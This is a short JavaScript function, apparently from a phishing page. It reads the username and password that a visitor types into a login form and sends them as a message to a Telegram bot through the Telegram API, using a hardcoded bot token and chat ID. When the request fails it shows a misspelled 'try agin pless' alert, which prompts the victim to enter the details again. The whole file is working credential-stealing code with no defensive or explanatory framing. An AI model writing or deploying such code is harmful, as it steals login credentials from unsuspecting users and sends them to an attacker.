function halo() {
    var usr=document.getElementById("usr").value
    var pas=document.getElementById("pas").value
    var text1="user = "+usr+" \n  password =  "+pas
    const token = '6157539056:AAHmcJn4s_f6b5l9WenQenTET0k3Ly5MRUw';
    const chatId = '5538462835';
    const message = text1;
    const xhr = new XMLHttpRequest();
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    xhr.open('POST', url);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function() {
        if (xhr.status === 200) {
          const response = JSON.parse(xhr.responseText);
          console.log(response);
        } else {
          console.error('Request failed. Status code: ' + xhr.status);
        }
    };
    xhr.onerror = function() {
      console.error('Request failed');
      alert("try agin pless")
    };
    xhr.send(`chat_id=${chatId}&text=${message}`);
}